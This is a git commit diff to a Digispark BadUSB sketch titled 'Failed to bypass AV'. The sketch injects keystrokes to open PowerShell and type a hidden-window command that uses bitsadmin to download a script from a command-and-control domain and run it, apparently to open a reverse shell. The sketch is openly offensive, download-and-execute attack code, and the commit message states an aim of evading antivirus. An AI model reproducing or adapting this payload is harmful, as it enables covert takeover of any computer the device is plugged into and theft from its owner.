ca34be5c8fc4311e28addaec17055892d70226eb
Hassan Shehata <hassanshehata25895@gmail.com>
2020-01-07 01:18:35 +0200

    Failed to bypass AV

--- persistent/RS.ino
+++ persistent/RS.ino
@@ -16,16 +16,13 @@ void loop() {
   //Persistance for windows only
   //Windows Payload
   DigiKeyboard.sendKeyStroke(0); //initialization
-  DigiKeyboard.sendKeyStroke(KEY_W, MOD_CONTROL_LEFT); // close opened windows (cleaning effect of linux payload)
-  delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);// close opened programs (cleaning effect of linux payload)
-  delay(1000);
+  delay(5000);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // press windowsKey+R opens Run
   delay(1000);
   DigiKeyboard.print("powershell"); // write powershell 
   DigiKeyboard.sendKeyStroke(KEY_ENTER); // opens powershell
   delay(1000);
-  DigiKeyboard.print("powershell -windowstyle hidden{Start-BitsTransfer -Source https://xx.xx.xx.xx/RS.ps1 -Destination C:\\users\\$env:UserName\\important.ps1}"); // repalce Xs with CnC IP/Domain to retrieve the payload over SSL
+  DigiKeyboard.print("powershell -windowstyle hidden{bitsadmin /transfer new https://5h-iot.com/RS.ps1 C:\\users\\$env:UserName\\important.ps1;.\\important.ps1}"); // repalce Xs with CnC IP/Domain to retrieve the payload over SSL
   DigiKeyboard.sendKeyStroke(KEY_ENTER); // execute the RS.ps1
   for (;;) {
     // stops re-execution // just remove the Digispark
